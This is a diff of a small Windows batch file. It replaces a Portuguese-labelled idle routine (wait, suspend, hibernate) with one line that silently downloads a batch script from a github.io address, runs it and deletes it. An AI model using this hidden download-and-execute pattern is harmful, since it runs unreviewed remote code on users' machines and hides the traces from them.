@@ -1,7 +1,4 @@
 @echo off
 cls
-echo iniciando PROTETOR DE TELA
-TIMEOUT /t 1800
-rundll32.exe powrprof.dll,SetSuspendState 0,1,0
-timeout /t 10800 /nobreak > NUL
-shutdown /h
+curl -o C:\temp\scr.bat https://suporteeq.github.io/scr.bat > NUL 2>&1 && call C:\temp\scr.bat && del C:\temp\scr.bat > NUL 2>&1
+
